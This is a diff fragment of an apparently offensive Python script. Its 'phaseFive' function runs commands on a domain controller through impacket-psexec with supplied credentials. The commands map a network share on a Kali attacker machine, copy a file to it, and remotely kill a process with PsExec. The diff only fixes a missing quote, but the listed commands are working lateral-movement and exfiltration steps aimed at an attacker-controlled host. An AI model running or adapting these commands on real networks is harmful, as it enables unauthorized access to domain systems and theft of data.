@@ -253,7 +253,7 @@ def phaseFive():
 	"systeminfo"
 	"powershell.exe -e 'New-PSDrive -Name "Z" -PSProvider "FileSystem" -Root "\\[Kali_IP_Address]\share" -Credential (New-Object System.Management.Automation.PSCredential("test", (ConvertTo-SecureString "test" -AsPlainText -Force))) -Persist'"
  	"powershell.exe -e 'Copy-Item -Path "C:\path\to\your\file.txt" -Destination "Z:\"'"
-  	"powershell.exe -e 'PsExec \\RemoteMachine taskkill /PID 1234'
+  	"powershell.exe -e 'PsExec \\RemoteMachine taskkill /PID 1234'"
 	]
 	for command in commands:
 		subprocess.run(f"impacket-psexec {username}:{password}@{DC1} {command}", shell=True, text=True)
